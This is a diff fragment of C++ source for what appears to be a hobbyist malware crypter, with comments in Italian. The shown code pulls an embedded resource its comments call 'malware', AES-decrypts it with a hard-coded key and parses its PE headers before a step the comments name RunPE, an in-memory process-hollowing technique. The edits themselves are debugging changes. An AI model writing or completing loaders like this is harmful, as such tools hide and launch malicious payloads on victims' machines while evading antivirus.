@@ -79,7 +79,7 @@ int main(){
         0x08, 0x88, 0x3e, 0x55, 0xa8, 0x9c, 0x0f, 0xf4,
         0x92, 0xa7, 0x45, 0x58, 0x4f, 0x18, 0x33, 0x22};
     //69 e' l' ID che ho assegnato in crypter_mio.cpp, BIN e' il tipo di risorsa, malwareLen e' la grandezza del malware(pass by reference)
-    unsigned char*resourcePtr = GetResource(132, "BIN", &malwareLen); 
+    unsigned char*resourcePtr = GetResource(69, "BIN", &malwareLen); 
 
     unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
     memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
@@ -87,10 +87,10 @@ int main(){
 
     AESDecrypt(malware, malwareLen, (char *)key, sizeof(key)); //decrypto il malware e lo salvo in pe
 
-    unsigned char* pe = malware; // pe sara' il puntatore ai byte del nostro malware
+    void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
     Sleep(1500);
     for(int i = 0; i < 2000; i++){
-        printf("%c", pe[i]);
+        printf("%c", malware[i]);
     }
     Sleep(3000);
     //Adesso arriva la roba strana del RunPE
@@ -113,11 +113,14 @@ int main(){
     NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);  // assegno a NtHeader il puntatore al NtHeader calcolandolo
     // come indirizzo del DOS header + e_lfanew che sarebbe l' offset del NT header rispetto all' inizio del DOS header
 
-//checko se il NT header e' valido: dal msdn:
-//Signature:
-//A 4-byte signature identifying the file as a PE image. The bytes are "PE\0\0".
+    //checko se il NT header e' valido: dal msdn:
+    //Signature:
+    //A 4-byte signature identifying the file as a PE image. The bytes are "PE\0\0".
+
+    printf("magic number DOS_header: %d", DOSHeader->e_magic);
 
     printf("\nprima del check della signature");
+    printf("\nNtHeader: %p", (void*)NtHeader);
     printf("\nNtHeader->Signature: %d", NtHeader->Signature);
     printf("\nIMAGE_NT_SIGNATURE: %d", IMAGE_NT_SIGNATURE);
 
